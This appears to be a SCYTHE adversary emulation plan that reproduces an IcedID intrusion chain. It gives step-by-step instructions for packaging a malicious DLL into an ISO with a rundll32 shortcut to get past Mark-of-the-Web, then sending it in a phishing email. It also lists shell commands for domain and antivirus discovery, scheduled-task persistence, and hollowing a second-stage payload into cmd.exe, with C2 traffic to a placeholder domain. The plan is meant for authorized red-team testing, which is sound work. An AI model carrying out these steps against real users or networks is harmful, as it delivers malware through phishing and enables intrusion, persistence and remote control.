# IcedID - Adversary Emulation Plan

This threat is based on The DFIR Report post on April 25, 2022: https://thedfirreport.com/2022/04/25/quantum-ransomware/

This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-end execution. The initial access procedures leverage multiple defense evasion steps that would be wise to test in your enviornment.

## Automated Adversary Emulation with SCYTHE
### IcedID
1. Download and import the threats in JSON format to your SCYTHE instance
2. Create a new campaign `IcedID` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 60 --jitter 15`
3. Import from Existing Threat: IcedID
4. Launch the Campaign
5. Download payload in DLL format setting the entry-point to `DllRegisterServer`
6. Save the DLL as `dar.dll`
7. Follow steps for `Stage 2` before execution
8. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system
9. Put the DLL in the Folder2Iso of the working directory
10. In the Folder2Iso directory, create a shortcut called `Document` and set the `Target` to: `C:\Windows\System32\rundll32.exe dar.dll,DllRegisterServer`
11. Open a Windows command prompt and cd to the working directory
12. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\docs_invoice_173.iso" "IcedID" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it
13. Upload the zip file to a web server and copy the link
14. Send a phishing email with the link or with the .iso as an attachment
15. If the end user downloads and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.

### Stage 2
1. Create a new campaign `Stage2` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 60 --jitter 15`
2. Add any automation or import from another threat
3. Launch the Campaign
4. Download payload in EXE format and save it as `Stage2.exe`
5. Upload the `Stage2.exe` to the VFS under VFS:/shared/threats/IcedID/

## Manual Emulation
### Stage 1
1. Create a new campaign `IcedID` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 60 --jitter 15`
2. Download payload in DLL format setting the entry-point to `DllRegisterServer`
3. Save the DLL as `dar.dll`
4. Follow steps for `Stage 2` before execution
5. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system
6. Put the DLL in the Folder2Iso of the working directory
7. In the Folder2Iso directory, create a shortcut called `Document` and set the `Target` to: `C:\Windows\System32\rundll32.exe dar.dll,DllRegisterServer`
8. Open a Windows command prompt and cd to the working directory
9. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\docs_invoice_173.iso" "IcedID" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it
10. Upload the zip file to a web server and copy the link
11. Send a phishing email with the link or with the .iso as an attachment
12. If the end user downloads and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.

### Stage 2
1. Create a new campaign `Stage2` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 60 --jitter 15`
2. Add any automation or import from another threat
3. Launch the Campaign
4. Download payload in EXE format and save it as `Stage2.exe`
5. Upload the `Stage2.exe` to the VFS under VFS:/shared/threats/IcedID/

### Manual Execution from Stage 1 Shell
```
loader --load run
run cmd.exe /c chcp >&2
run WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
run ipconfig /all
run systeminfo
run net config workstation
run nltest /domain_trusts
run nltest /domain_trusts /all_trusts
run net group "Domain Admins" /domain
run SCHTASKS /Create /SC hourly /TN kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} /TR "rundll32.exe %USERPROFILE%\AppData\Local\user\{3231114A-23EA-C1E1-F549-3FA294BC3E48}\Ulfefi32.dll,DllMain --alyeqe=SketchRare\license.dat"
run cmd /c SCHTASKS /Delete /TN kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} /F >nul 2>&1
loader --load phollowing
phollowing --src VFS:/shared/threats/IcedID/Stage2.exe --target "C:\Windows\SysWOW64\cmd.exe"
controller --shutdown
```